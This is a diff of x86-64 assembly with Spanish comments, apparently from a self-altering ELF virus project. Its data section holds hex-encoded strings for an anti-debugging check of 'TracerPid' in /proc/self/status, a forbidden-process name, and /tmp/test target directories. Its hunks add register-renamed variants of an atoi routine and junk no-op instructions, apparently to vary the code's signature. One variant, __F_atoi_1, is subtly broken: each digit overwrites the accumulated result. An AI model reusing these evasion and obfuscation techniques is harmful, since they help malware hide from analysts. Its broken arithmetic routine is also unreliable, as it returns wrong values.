@@ -499,6 +499,7 @@ section .text
             inc rsi                 ; siguiente caracter
             jmp .loop
         .done:
+            mov rax, rax
             ret
     __F_atoi__end:
 	F_atoi_len equ $ - __F_atoi
@@ -1184,7 +1185,7 @@ section .text
     __F_data:
     tracerPid_str   db      0x54,0x72,0x61,0x63,0x65,0x72,0x50,0x69,0x64,0x3A,0x9  ;"TracerPid:",0x9 ; 11
     status_file     db      0x2F,0x70,0x72,0x6F,0x63,0x2F,0x73,0x65,0x6C,0x66,0x2F,0x73,0x74,0x61,0x74,0x75,0x73,0 ;"/proc/self/status",0 ; 18
-    forbidden_prog  db      "/vim"
+    forbidden_prog  db      "/vim2"
     forbidden_prog_len equ  $ - forbidden_prog - 1
     exe_string      db      0x2F,0x65,0x78,0x65,0 ;"/exe",0 ; 5
     dirs            db      0x2F,0x74,0x6D,0x70,0x2F,0x74,0x65,0x73,0x74,0,0x2F,0x74,0x6D,0x70,0x2F,0x74,0x65,0x73,0x74,0x32,0,0  ;"/tmp/test",0,"/tmp/test2",0,0
@@ -1712,35 +1713,37 @@ section .text
     __F_atoi_0:
         ; rax = resultado
         .str_to_int:
-            xor rax, rax
+            xor rbx, rbx
         .loop:
-            movzx rcx, byte [rsi]   ; cargar caracter
-            test rcx, rcx           ; ¿fin de string?
+            movzx rdx, byte [rsi]   ; cargar caracter
+            test rdx, rdx           ; ¿fin de string?
             jz .done
-            sub rcx, '0'            ; convertir ASCII a número
-            imul rax, rax, 10       ; resultado *= 10
-            add rax, rcx            ; resultado += digito
+            sub rdx, '0'            ; convertir ASCII a número
+            imul rbx, rbx, 10       ; resultado *= 10
+            add rbx, rdx            ; resultado += digito
             inc rsi                 ; siguiente caracter
             jmp .loop
         .done:
+            mov rax, rbx
             ret
     __F_atoi_0__end:
 
     __F_atoi_1:
         ; rax = resultado
         .str_to_int:
-            xor rax, rax
+            xor rdx, rdx
         .loop:
-            movzx rcx, byte [rsi]   ; cargar caracter
-            test rcx, rcx           ; ¿fin de string?
+            movzx rbx, byte [rsi]   ; cargar caracter
+            test rbx, rbx           ; ¿fin de string?
             jz .done
-            sub rcx, '0'            ; convertir ASCII a número
-            imul rax, rax, 10       ; resultado *= 10
-            add rax, rcx            ; resultado += digito
+            sub rbx, '0'            ; convertir ASCII a número
+            imul rdx, rbx, 10       ; resultado *= 10
+            add rdx, rbx            ; resultado += digito
             inc rsi                 ; siguiente caracter
             jmp .loop
         .done:
-            ret
-    __F_atoi_1__end:
+            mov rax, rdx
+            ret    
+        __F_atoi_1__end:
 
     _finish:
